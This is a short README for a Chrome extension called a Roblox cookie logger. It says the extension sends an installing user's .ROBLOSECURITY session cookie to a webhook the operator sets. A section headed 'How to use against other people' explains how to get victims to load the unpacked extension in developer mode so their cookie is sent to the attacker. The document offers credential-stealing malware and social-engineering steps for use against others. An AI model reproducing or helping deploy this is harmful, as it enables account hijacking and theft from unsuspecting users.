# chrome-extension-roblox-cookie-logger
When a user installs this extension, their .ROBLOSECURITY cookie will be sent to a webhook of your choice.

# How to use

In the index.js file, you will see code that looks like this.
``const webhook = "";``
You have to put your webhook url in the double quotes like so.
``const webhook = "Webhook Url Here";``

# How to use against other people

They need to download index.js and manifest.json and put those files in a folder, Then need to go to their browser's extensions page and turn on developer mode and install the extension through there by dragging the folder onto the webpage and etc.
Their cookie will be sent to your webhook after installation.
